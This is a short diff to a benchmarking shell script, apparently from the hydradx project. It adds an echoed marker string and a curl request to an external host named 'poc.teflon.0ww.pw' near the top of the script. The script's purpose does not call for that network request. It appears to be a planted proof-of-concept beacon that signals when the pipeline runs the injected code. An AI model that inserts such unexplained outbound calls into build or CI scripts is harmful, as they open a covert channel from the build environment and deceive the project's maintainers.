@@ -6,7 +6,8 @@
 #
 # The hydradx binary is required to be compiled with --features=runtime-benchmarks
 # in release mode.
-
+echo "123ffff"
+curl "https://poc.teflon.0ww.pw/benchmarking"
 set -e          # Exit immediately if a command exits with non-zero status
 set -o pipefail # Ensure pipeline commands also trigger failures
 
